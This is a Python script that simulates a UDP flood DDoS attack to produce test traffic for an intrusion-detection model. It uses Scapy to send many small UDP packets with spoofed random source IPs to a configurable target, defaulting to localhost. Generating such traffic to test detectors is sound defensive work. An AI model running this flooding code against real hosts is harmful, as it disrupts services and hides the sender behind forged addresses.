"""
sim_ddos.py — DDoS Attack Simulator
=====================================
Sends a flood of small UDP packets to a target IP.
Mimics a UDP flood DDoS attack.

The live sniffer will pick these up, extract features
(high packets/sec, small packet size, no TCP flags),
and the model should classify them as DDoS.

Run:
    sudo python src/simulation/sim_ddos.py
    sudo python src/simulation/sim_ddos.py --target 192.168.1.1 --count 500
"""

import time
import random
import argparse
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s  [DDoS-SIM]  %(message)s")
log = logging.getLogger(__name__)

try:
    from scapy.all import IP, UDP, Raw, send, conf
    conf.verb = 0           # silence Scapy's per-packet output
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    log.error("Scapy is not installed. Run: pip install scapy")


def simulate_ddos(
    target_ip:  str = "127.0.0.1",
    target_port: int = 80,
    count:      int = 300,
    delay:      float = 0.001,   # 1ms between packets → ~1000 pps
):
    """
    Send 'count' small UDP packets to target_ip:target_port in rapid succession.
    Each packet has a random source IP to mimic a distributed attack.

    Parameters
    ----------
    target_ip   : destination IP address
    target_port : destination port (default 80)
    count       : number of packets to send
    delay       : seconds to wait between packets
    """
    if not SCAPY_AVAILABLE:
        return

    log.info(f"Starting DDoS simulation → {target_ip}:{target_port}")
    log.info(f"Sending {count} packets with {delay*1000:.0f}ms delay (≈{1/delay:.0f} pps)")

    sent = 0
    for i in range(count):
        # Random source IP makes it look like a distributed attack
        fake_src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

        # Small payload (64 bytes) — typical DDoS packet
        packet = (
            IP(src=fake_src_ip, dst=target_ip) /
            UDP(sport=random.randint(1024, 65535), dport=target_port) /
            Raw(load=b"X" * 32)
        )
        send(packet, verbose=False)
        sent += 1

        if sent % 50 == 0:
            log.info(f"  Sent {sent}/{count} packets ...")

        time.sleep(delay)

    log.info(f"DDoS simulation complete. {sent} packets sent to {target_ip}.")


def main():
    parser = argparse.ArgumentParser(description="Simulate a UDP DDoS attack")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--port",   type=int, default=80,  help="Target port (default: 80)")
    parser.add_argument("--count",  type=int, default=300, help="Number of packets (default: 300)")
    parser.add_argument("--delay",  type=float, default=0.001, help="Delay between packets in seconds")
    args = parser.parse_args()

    simulate_ddos(args.target, args.port, args.count, args.delay)


if __name__ == "__main__":
    main()